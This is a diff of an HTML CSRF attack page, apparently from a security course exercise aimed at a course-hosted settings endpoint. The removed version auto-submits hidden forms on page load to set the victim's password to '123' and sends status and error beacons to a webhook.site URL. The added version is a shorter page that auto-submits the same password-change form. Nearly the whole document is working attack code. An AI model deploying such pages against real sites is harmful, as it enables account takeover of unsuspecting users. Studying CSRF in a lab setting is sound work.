@@ -3,58 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Form</title>
-    <script>
-        window.onload = function() {
-            var form = document.createElement("form");
-            var formCheck = document.createElement("form");
-            form.method = "POST";
-            form.action = "https://cats.is-course.ru/settings"; // Target URL
-            formCheck.method = "GET";
-            formCheck.action = 'https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f';
-
-            var passwordInput = document.createElement("input");
-            passwordInput.type = "hidden";
-            passwordInput.name = "password";
-            passwordInput.value = "123";
-            form.appendChild(passwordInput);
-
-            var confirmPasswordInput = document.createElement("input");
-            confirmPasswordInput.type = "hidden";
-            confirmPasswordInput.name = "confirm-password";
-            confirmPasswordInput.value = "123";
-            form.appendChild(confirmPasswordInput);
-
-            var formCheckInput = document.createElement("input");
-            formCheckInput.type = "hidden";
-            formCheckInput.name = "check";
-            formCheckInput.value = "true";
-            formCheck.appendChild(formCheckInput);
-
-            document.body.appendChild(form);
-            document.body.appendChild(formCheck);
-            try {
-                formCheck.submit();
-                form.submit();
-            } catch (error) {
-                var formError = document.createElement("form");
-                formError.method = "GET";
-                formError.action = 'https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f';
-                var formErrorInput = document.createElement("input");
-                formErrorInput.type = "hidden";
-                formErrorInput.name = "error";
-                formErrorInput.value = error;
-                formError.appendChild(formErrorInput);
-                document.body.appendChild(formError);
-                formError.target = 'dummyframe'
-                formError.submit();
-            }
-        }
-    </script>
+    <title>CSRF Attack</title>
 </head>
 <body>
-<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
-<iframe name="dummyframe" id="dummyframe2" style="display: none;"></iframe>
-<img src="https://webhook.site/24cf98c9-2c0f-4476-9196-72cbb3ab749f?by_img=true" style="display:none"/>
+    <h1>CSRF Attack Page</h1>
+    <form id="csrfForm" action="https://cats.is-course.ru/settings" method="POST">
+        <input type="hidden" name="password" value="123">
+        <input type="hidden" name="confirm-password" value="123">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
